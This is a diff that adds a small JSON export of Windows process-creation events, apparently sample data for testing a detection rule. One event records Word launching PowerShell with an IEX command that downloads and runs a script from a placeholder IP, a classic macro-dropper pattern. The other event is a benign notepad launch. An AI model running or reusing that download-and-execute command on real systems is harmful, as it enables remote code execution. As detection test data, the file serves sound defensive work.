@@ -1,0 +1,37 @@
+{
+  "exported_at": "2026-11-20T08:00:00Z",
+  "retained_fields": [
+    "process.parent.name",
+    "process.command_line",
+    "process.executable",
+    "user.name"
+  ],
+  "events": [
+    {
+      "timestamp": "2026-11-18T10:15:00Z",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "data": {
+        "process.parent.name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "process.command_line": "powershell.exe -NoP -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/p.ps1')\"",
+        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwsh.exe",
+        "user.name": "analyst"
+      }
+    },
+    {
+      "timestamp": "2026-11-18T10:16:00Z",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "data": {
+        "process.parent.name": "C:\\Windows\\explorer.exe",
+        "process.command_line": "notepad.exe report.txt",
+        "process.executable": "C:\\Windows\\System32\\notepad.exe",
+        "user.name": "analyst"
+      }
+    }
+  ]
+}
